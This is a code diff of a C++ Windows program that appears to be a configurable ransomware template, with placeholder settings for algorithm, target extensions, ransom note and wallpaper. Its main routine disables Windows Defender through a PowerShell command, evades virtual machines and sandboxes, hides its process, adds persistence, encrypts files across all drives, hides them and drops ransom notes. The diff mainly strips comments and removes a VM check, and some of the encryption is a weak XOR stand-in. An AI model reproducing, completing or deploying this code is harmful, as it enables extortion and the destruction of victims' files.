@@ -54,16 +54,13 @@ private:
     
 public:
     AES_GCM() : hProv(NULL), hKey(NULL), hHash(NULL) {
-        // Генерируем случайный ключ и IV
         if (!CryptAcquireContextW(&hProv, NULL, NULL, PROV_RSA_AES, CRYPT_VERIFYCONTEXT)) {
             return;
         }
         
-        // Генерируем 256-битный ключ
         for (int i = 0; i < 32; i++) key[i] = rand() % 256;
         for (int i = 0; i < 12; i++) iv[i] = rand() % 256;
         
-        // Импортируем ключ
         struct {
             BLOBHEADER hdr;
             DWORD keySize;
@@ -79,7 +76,6 @@ public:
         
         CryptImportKey(hProv, (BYTE*)&keyBlob, sizeof(keyBlob), 0, 0, &hKey);
         
-        // Устанавливаем режим GCM
         DWORD mode = CRYPT_MODE_GCM;
         CryptSetKeyParam(hKey, KP_MODE, (BYTE*)&mode, 0);
         CryptSetKeyParam(hKey, KP_IV, iv, 0);
@@ -95,12 +91,10 @@ public:
         if (!hKey) return false;
         
         DWORD dataLen = input.size();
-        DWORD encLen = dataLen + 16; // +16 для тега аутентификации
+        DWORD encLen = dataLen + 16;
         
-        output.resize(encLen + 12); // 12 байт IV + зашифрованные данные + тег
+        output.resize(encLen + 12);
         memcpy(output.data(), iv, 12);
-        
-        // Копируем входные данные
         memcpy(output.data() + 12, input.data(), dataLen);
         
         DWORD outLen = dataLen;
@@ -127,13 +121,9 @@ public:
     }
     
     void Encrypt(const std::vector<BYTE>& input, std::vector<BYTE>& output) {
-        // Реализация Salsa20 (упрощённая)
         output.resize(input.size() + 8);
         memcpy(output.data(), nonce, 8);
         
-        // XOR с псевдослучайной последовательностью
-        // В реальном коде здесь полная реализация Salsa20
-        // Для демонстрации — XOR
         for (size_t i = 0; i < input.size(); i++) {
             output[8 + i] = input[i] ^ (key[i % 32] ^ nonce[i % 8]);
         }
@@ -154,7 +144,6 @@ public:
             return;
         }
         
-        // Генерируем RSA-2048 ключ
         CryptGenKey(hProv, CALG_RSA_KEYX, 2048 << 16, &hKey);
     }
     
@@ -169,7 +158,6 @@ public:
         DWORD dataLen = input.size();
         DWORD encLen = 0;
         
-        // Получаем размер зашифрованных данных
         CryptEncrypt(hKey, 0, TRUE, 0, NULL, &dataLen, 0);
         encLen = dataLen;
         
@@ -206,7 +194,6 @@ bool ends_with(const std::wstring& str, const std::wstring& suffix) {
 void set_wallpaper(const std::string& base64_data, const std::string& ext) {
     if (base64_data.empty()) return;
     
-    // Декодируем base64
     DWORD size = 0;
     CryptStringToBinaryA(base64_data.c_str(), base64_data.length(), CRYPT_STRING_BASE64, NULL, &size, NULL, NULL);
     if (size == 0) return;
@@ -214,17 +201,14 @@ void set_wallpaper(const std::string& base64_data, const std::string& ext) {
     std::vector<BYTE> data(size);
     CryptStringToBinaryA(base64_data.c_str(), base64_data.length(), CRYPT_STRING_BASE64, data.data(), &size, NULL, NULL);
     
-    // Временный файл
     wchar_t temp_path[MAX_PATH];
     GetTempPathW(MAX_PATH, temp_path);
     std::wstring wall_path = std::wstring(temp_path) + L"wall" + std::wstring(ext.begin(), ext.end());
     
-    // Сохраняем
     std::ofstream out(wall_path, std::ios::binary);
     out.write((char*)data.data(), data.size());
     out.close();
     
-    // Устанавливаем обои
     SystemParametersInfoW(SPI_SETDESKWALLPAPER, 0, (PVOID)wall_path.c_str(), SPIF_UPDATEINIFILE | SPIF_SENDCHANGE);
 }
 
@@ -240,7 +224,6 @@ void add_persistence() {
 }
 
 void hide_files(const std::wstring& ext) {
-    // Получаем все диски
     wchar_t drives[256];
     GetLogicalDriveStringsW(256, drives);
     
@@ -257,7 +240,6 @@ void hide_files(const std::wstring& ext) {
 }
 
 bool detect_vm() {
-    // Проверка по процессам
     HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
     if (snap != INVALID_HANDLE_VALUE) {
         PROCESSENTRY32W pe;
@@ -278,24 +260,10 @@ bool detect_vm() {
         CloseHandle(snap);
     }
     
-    // Проверка MAC-адресов
-    try {
-        std::ifstream mac_file("C:\\Windows\\System32\\drivers\\etc\\hosts");
-        std::string line;
-        while (std::getline(mac_file, line)) {
-            if (line.find("00:05:69") != std::string::npos ||
-                line.find("00:0c:29") != std::string::npos ||
-                line.find("00:50:56") != std::string::npos) {
-                return true;
-            }
-        }
-    } catch (...) {}
-    
     return false;
 }
 
 void disable_defender() {
-    // Отключаем реальную защиту через PowerShell
     system("powershell -Command \"Set-MpPreference -DisableRealtimeMonitoring $true\"");
 }
 
@@ -305,7 +273,6 @@ void fake_process_name() {
 
 void hide_process() {
     try {
-        // Скрываем из Task Manager
         SetProcessInformation(GetCurrentProcess(), (PROCESS_INFORMATION_CLASS)3, NULL, 0);
     } catch (...) {}
 }
@@ -461,15 +428,12 @@ void drop_notes(const std::vector<std::wstring>& drives,
 // ГЛАВНАЯ ФУНКЦИЯ
 // ============================================================
 int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
-    // Инициализация случайных чисел
     srand(GetTickCount() ^ GetCurrentProcessId());
     
-    // Анти-VM
     if (ANTI_VM_ENABLED_PLACEHOLDER && detect_vm()) {
         return 0;
     }
     
-    // Маскировка
     if (FAKE_PROCESS_ENABLED_PLACEHOLDER) {
         fake_process_name();
     }
@@ -477,7 +441,6 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine
         hide_process();
     }
     
-    // Отключение защиты
     if (DISABLE_DEFENDER_ENABLED_PLACEHOLDER) {
         disable_defender();
     }
@@ -485,12 +448,10 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine
         add_persistence();
     }
     
-    // Задержка для обхода песочниц
     if (SANDBOX_DELAY_ENABLED_PLACEHOLDER) {
         Sleep(60000);
     }
     
-    // Парсим параметры
     std::wstring drives_str = DRIVES_PLACEHOLDER;
     std::wstring exts_str = EXTS_PLACEHOLDER;
     std::wstring exclude_str = FOLDERS_EXCLUDE_PLACEHOLDER;
@@ -502,7 +463,6 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine
     
     int algo = ALGO_PLACEHOLDER;
     
-    // Шифруем в потоках
     std::vector<std::thread> threads;
     for (const auto& drive : drives) {
         threads.emplace_back(walk_and_encrypt, drive, std::ref(extensions),
@@ -512,23 +472,15 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine
         t.join();
     }
     
-    // Скрываем файлы
     if (HIDE_FILES_ENABLED_PLACEHOLDER) {
         hide_files(encrypted_ext);
     }
     
-    // Создаём файлы выкупа
     std::wstring note_name = NOTE_NAME_PLACEHOLDER;
     std::wstring note_content = NOTE_CONTENT_PLACEHOLDER;
     drop_notes(drives, exclude_folders, note_name, note_content);
     
-    // Устанавливаем обои
     set_wallpaper(WALLPAPER_PLACEHOLDER, ".jpg");
-    
-    // Самоуничтожение (опционально)
-    // wchar_t exe_path[MAX_PATH];
-    // GetModuleFileNameW(NULL, exe_path, MAX_PATH);
-    // DeleteFileW(exe_path);
     
     return 0;
 }
